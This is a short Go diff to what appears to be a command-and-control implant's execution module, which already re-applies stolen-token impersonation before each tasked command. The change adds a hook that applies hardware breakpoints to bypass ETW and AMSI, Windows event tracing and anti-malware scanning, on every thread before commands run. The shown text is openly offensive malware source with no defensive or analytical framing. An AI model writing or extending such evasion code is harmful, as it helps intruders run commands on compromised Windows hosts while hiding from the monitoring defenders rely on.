@@ -13,6 +13,9 @@ import "runtime"
 // threads, silently losing the impersonation.
 var osThreadLocked bool
 
+// HWBP application function variable, to be set by main package
+var ApplyHWBPToCurrentThread func()
+
 // PrepareExecution re-applies token impersonation before each command.
 // Called from main.go's processTaskWithAgent before command dispatch.
 //
@@ -22,7 +25,14 @@ var osThreadLocked bool
 //
 // This ensures every command sees the impersonated identity regardless
 // of Go's goroutine scheduling.
+//
+// Also, it applies Hardware Breakpoints (HWBP) for ETW/AMSI bypass to the current OS thread.
 func PrepareExecution() {
+	// Apply HWBP to bypass ETW and AMSI on this thread
+	if ApplyHWBPToCurrentThread != nil {
+		ApplyHWBPToCurrentThread()
+	}
+
 	tokenMutex.Lock()
 	token := gIdentityToken
 	tokenMutex.Unlock()
